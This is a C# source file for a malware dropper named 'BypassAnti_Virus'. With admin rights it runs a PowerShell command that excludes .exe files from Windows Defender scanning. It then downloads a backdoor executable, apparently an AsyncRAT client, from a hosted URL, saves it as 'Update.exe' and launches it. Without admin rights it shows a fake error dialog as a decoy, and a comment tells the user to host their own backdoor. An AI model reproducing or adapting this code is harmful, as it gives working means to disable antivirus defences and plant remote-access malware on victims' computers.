using BypassAnti_Virus.plugin;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BypassAnti_Virus
{
    internal static class Program
    {
        static string folder = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        static string path = Path.Combine(folder, "Update.exe");
        static void Main()
        {
            if (rolecheck.IsAdministrator())
            {
                string command = "Add-MpPreference -ExclusionExtension .exe,exe";
                if (CLI.Powershell(command))
                {
                    Thread.Sleep(1000);
                    //upload the backdoor somewhere online or host it your-self and paste the url here
                    string url = "http://192.168.0.242:8000/AsyncClient.exe";
                    if (file.download(url, path))
                    {
                        Process.Start(path);
                    }
                }
            }
            else
            {
                MessageBox.Show("The specified quick mode policy already exists.", "0x32C8", MessageBoxButtons.OK);
            }
        }
        
    }
}
